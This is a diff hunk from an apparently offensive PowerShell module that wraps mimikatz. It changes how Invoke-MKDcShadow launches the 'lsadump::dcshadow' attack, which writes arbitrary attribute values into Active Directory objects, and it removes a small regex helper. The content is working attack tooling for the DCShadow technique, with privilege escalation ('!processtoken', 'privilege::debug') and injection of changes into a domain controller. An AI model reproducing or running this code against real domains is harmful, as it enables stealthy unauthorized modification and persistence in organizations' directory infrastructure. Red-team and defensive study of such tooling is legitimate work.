@@ -127,47 +127,11 @@ function Invoke-MKDcShadow {
             mimikatz.exe privilege::debug "lsadump::dcshadow /push" exit
         }
         else {
-
-            $PushJob = Start-Job  {
-                Start-Sleep 5
-
-                mimikatz.exe lsadump::dcshadow "/push exit"
-
-                Start-Sleep  5
-
-                Get-Process mimikatz | Stop-Process
-            }
-
-            mimikatz.exe privilege::debug "lsadump::dcshadow /object:$Object /attribute:$attribute /value:$Value /domain:$Domain"
-
-            $PushJob | Wait-Job | Out-Null
+            Start-Process -FilePath mimikatz.exe -ArgumentList @("!processtoken", "privilege::debug", "`"lsadump::dcshadow /object:$Object /attribute:$attribute /value:$Value /domain:$Domain`"") -Wait | Out-Null
         }
     }
 }
 
-function ConvertTo-Object {
-    param(
-      [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
-      [string[]]$InputString,
-  
-      [Parameter(Mandatory=$true,ValueFromRemainingArguments=$true)]
-      [string]$Pattern
-    )
-  
-    process{
-      foreach($string in $InputString){
-  
-        $Matches = [System.Text.RegularExpressions.RegEx]::Matches($InputString, $Pattern)
-        foreach($match in $matches) {
-          $Properties = $match.Groups | Select-Object -Skip 1 | ForEach-Object -Begin {$t = @{}} -Process {$t[$_.Name] = $_.Value} -End {$t}
-          [PSCustomObject]$Properties
-        }
-      }
-    }
-  }
-  
-  
-  
   function ConvertFrom-MKOutput {
       param(
           [Parameter(ValueFromPipeline)]
